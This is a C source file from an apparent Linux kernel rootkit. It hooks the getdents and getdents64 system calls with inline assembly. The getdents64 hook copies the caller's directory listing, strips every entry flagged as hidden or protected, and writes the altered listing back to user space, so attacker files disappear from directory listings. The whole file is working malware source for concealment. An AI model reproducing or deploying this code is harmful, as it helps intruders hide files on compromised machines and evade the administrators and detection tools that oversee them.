#include "../inc/cmds.h"
#include "../inc/hook.h"
#include "../inc/util.h"

#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/slab.h>

void *_getdents   = NULL;
void *_getdents64 = NULL;

asmlinkage int64_t h_getdents(const struct pt_regs *r) {
  int64_t ret = 0;
  hfind(_getdents, "__x64_sys_getdents");

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "call *%3;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_getdents)
      : "%r15", "%rdi", "%rax");

  return ret;
}

asmlinkage int64_t h_getdents64(const struct pt_regs *r) {
  struct linux_dirent64 *dirl = NULL, *cur = NULL, *prev = NULL;
  char                  *_fd_path = NULL, *fd_path = NULL, *cur_path = NULL;
  int64_t                ret = 0, pos = 0;
  uint32_t               fd = r->di;
  struct path            path;

  hfind(_getdents64, "__x64_sys_getdents64");

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "call *%3;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_getdents64)
      : "%r15", "%rdi", "%rax");

  // if the call failed we dont have anything to do
  if (ret <= 0)
    goto end;

  if (NULL == (_fd_path = fd_path = kmalloc(PATH_MAX + 1, GFP_KERNEL))) {
    debg("failed to allocate fd_path");
    goto end;
  }

  if (NULL == (fd_path = path_from_fd(fd, fd_path))) {
    debgf("failed to get path from fd %d", fd);
    goto end;
  }

  if (NULL == (dirl = kzalloc(ret, GFP_KERNEL))) {
    debg("failed to allocate dirent list");
    goto end;
  }

  // (r)si stores the users dirent list, lets copy that we need to modify it
  if (copy_from_user(dirl, (void *)r->si, ret)) {
    debg("copy_from_user failed while copying dirent list");
    goto end;
  }

  // loop over all the entries
  while (pos < ret) {
    cur = (void *)dirl + pos;

    if (NULL == (cur_path = path_join(fd_path, cur->d_name))) {
      debgf("failed to obtain current path for entry: %s", cur->d_name);
      goto next;
    }

    if (kern_path(cur_path, LOOKUP_FOLLOW, &path) != 0) {
      debgf("failed to obtain path for entry: %s", cur->d_name);
      goto next;
    }

    if (!is_path_hidden(&path) && !is_path_protected(&path))
      goto next;

    if (cur == dirl) {
      ret -= cur->d_reclen;
      memmove(cur, (void *)cur + cur->d_reclen, ret);
      goto cont;
    }

    prev->d_reclen += cur->d_reclen;
    pos += cur->d_reclen;
    goto cont;

  next:
    // move to the next entry
    prev = cur;
    pos += cur->d_reclen;

  cont:
    kfree(cur_path);
    cur_path = NULL;
  }

  if (copy_to_user((void *)r->si, dirl, ret)) {
    debg("copy_to_user failed while copying back the dirent list");
    goto end;
  }

end:
  kfree(_fd_path);
  kfree(dirl);

  return ret;
}
